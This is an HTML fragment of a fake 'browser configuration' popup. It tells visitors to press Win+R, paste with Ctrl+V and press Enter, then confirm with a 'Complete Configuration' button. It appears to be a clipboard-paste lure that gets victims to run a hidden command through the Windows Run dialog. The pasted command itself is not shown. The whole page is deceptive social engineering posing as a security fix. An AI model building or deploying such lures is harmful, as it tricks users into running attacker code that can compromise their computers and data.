...
<div class="popup" id="popup">
    <!-- Title Section with Animated Gear Icon -->
    

    <!-- Main Content -->
    <div class="popup-content">
        <p>Your browser configuration may be outdated or incompatible with the security protocols required by this site. Updating your configuration will ensure access to all site features and help prevent potential issues while browsing.</p>
        <p>Please follow these steps to update your configuration and ensure a secure browsing experience.</p>
    </div>

    <!-- Dropdown Section -->
    

    <!-- Dropdown Content with Step-by-Step Instructions -->
    <div class="dropdown-content" id="dropdown-content" style="display: block;">
        <p>
            <span class="step-icon">1</span> Press the Windows Key 
            <span class="key-term"><img src="https://link.storjshare.io/s/jvewyt3jkp4x2eaiwjmdpr2qlcnq/image/winkey.png?wrap=0" alt="Windows icon" class="win-icon">Win</span> + 
            <span class="key-term">R</span>. 
            <a href="#" onclick="showImage('https://link.storjshare.io/s/jxtcd6fovyctslohjpse374xtb5a/image/win%2Br.jpg?wrap=0'); return false;">[Show]</a>
        </p>
        <p>
            <span class="step-icon">2</span> Press <span class="key-term">CTRL</span> + <span class="key-term">V</span>.
            <a href="#" onclick="showImage('https://link.storjshare.io/s/jum6xdtvufboe2hqqswxelqhu7ga/image/CTRL%2Bv.jpg?wrap=0'); return false;">[Show]</a>
        </p>
        <p>
            <span class="step-icon">3</span> Press <span class="key-term" style="margin-right: 0px;">Enter.</span>
        </p>
    </div>

    <!-- Checkbox Agreement -->
    <div class="popup-checkbox">
        <input type="checkbox" id="agree-checkbox" onclick="toggleButton()">
        <label for="agree-checkbox">I confirm that I have followed all the steps outlined above.</label>
    </div>

    <!-- Footer with Centered Confirmation Button -->
    <div class="popup-footer">
        <button type="button" id="download-button" onclick="startVerification()" class="" disabled="true">Complete Configuration</button>
        <p id="error-message">Oops! Something went wrong. Let’s try that again in a moment.</p>
    </div>
</div>
...
<div class="modal" id="image-modal">
    <div class="modal-content">
        ...
        <img src="" alt="Step Image" id="modal-image">
    </div>
</div>
